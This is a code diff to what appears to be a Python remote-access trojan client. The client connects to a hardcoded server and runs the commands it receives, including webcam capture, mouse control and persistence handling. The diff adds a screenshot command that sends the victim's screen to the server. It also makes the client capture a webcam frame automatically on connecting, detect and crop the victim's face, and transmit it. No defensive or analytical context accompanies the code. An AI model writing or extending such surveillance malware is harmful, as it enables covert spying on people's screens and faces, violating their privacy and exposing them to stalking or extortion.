@@ -18,7 +18,7 @@ from datetime import datetime
 import platform
 import logging
 # === CONFIG ===
-SERVER_HOST = "192.168.1.3"  # Update to your server IP
+SERVER_HOST = "172.16.78.1"  # Update to your server IP
 TCP_PORT = 5555
 WS_PORT = 8765
 
@@ -39,9 +39,8 @@ def tcp_handler():
                 tcp_client.settimeout(10)
                 tcp_client.connect((SERVER_HOST, TCP_PORT))
                 tcp_client.settimeout(None)
-                tcp_connected = True
             logging.info("✅ TCP Connected")
-
+            send_webcam_image()
             while True:
                 data = tcp_client.recv(4096).decode()
                 if not data:
@@ -221,6 +220,8 @@ def execute_command(command):
             remove_persistence()
         elif command.startswith("WEBCAM"):
             send_webcam_image()
+        elif command.startswith("SCREENSHOT"):
+            take_screenshot()
         elif command.startswith("MOUSE_CLICK"):
             pyautogui.click()
         elif command.startswith("MOUSE_MOVE:"):
@@ -249,17 +250,61 @@ def execute_command(command):
     except Exception as e:
         tcp_client.send(f"CMD ERROR: {e}".encode())
 
+def take_screenshot():
+    try:
+        import mss
+        import numpy as np
+        import cv2
+        import base64
+        import time
+        logging.info("[SCREENSHOT] Taking screenshot...")
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
+            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_BGRA2BGR)
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            filename = f"screenshot_{timestamp}.jpg"
+            cv2.imwrite(filename, frame)
+            _, jpeg = cv2.imencode('.jpg', frame)
+            b64 = base64.b64encode(jpeg).decode()
+            tcp_client.send(f"SCREENSHOT:{b64}".encode())
+            logging.info(f"[SCREENSHOT] Screenshot taken and sent as {filename}.")
+    except Exception as e:
+        logging.error(f"[SCREENSHOT] Exception: {e}")
+        tcp_client.send(f"SCREENSHOT ERROR: {e}".encode())
+
 # === Webcam ===
 def send_webcam_image():
     try:
-        cam = cv2.VideoCapture(0)
-        ret, frame = cam.read()
-        cam.release()
-        if ret:
-            _, jpeg = cv2.imencode(".jpg", frame)
-            b64 = base64.b64encode(jpeg).decode()
-            tcp_client.send(f"WEBCAM:{b64}".encode())
+        logging.info("[WEBCAM] Attempting to access webcam...")
+        # Try multiple camera indexes
+        for cam_index in range(3):
+            cam = cv2.VideoCapture(cam_index)
+            ret, frame = cam.read()
+            cam.release()
+            if ret:
+                logging.info(f"[WEBCAM] Webcam frame captured from index {cam_index}. Shape: {frame.shape}")
+                # Save the frame locally for debugging
+                cv2.imwrite(f"test_webcam_{cam_index}.jpg", frame)
+                face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
+                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+                faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(80, 80))
+                if len(faces) > 0:
+                    (x, y, w, h) = faces[0]
+                    face_img = frame[y:y+h, x:x+w]
+                    _, jpeg = cv2.imencode(".jpg", face_img)
+                    logging.info(f"[WEBCAM] Face detected and cropped: x={x}, y={y}, w={w}, h={h}")
+                else:
+                    _, jpeg = cv2.imencode(".jpg", frame)
+                    logging.info("[WEBCAM] No face detected, sending full frame.")
+                b64 = base64.b64encode(jpeg).decode()
+                tcp_client.send(f"WEBCAM:{b64}".encode())
+                logging.info("[WEBCAM] Image sent to server.")
+                return
+        logging.error("[WEBCAM] Camera read failed on all indexes.")
+        tcp_client.send(f"WEBCAM ERROR: Camera read failed on all indexes".encode())
     except Exception as e:
+        logging.error(f"[WEBCAM] Exception: {e}")
         tcp_client.send(f"WEBCAM ERROR: {e}".encode())
 
 # === Stream Screen ===
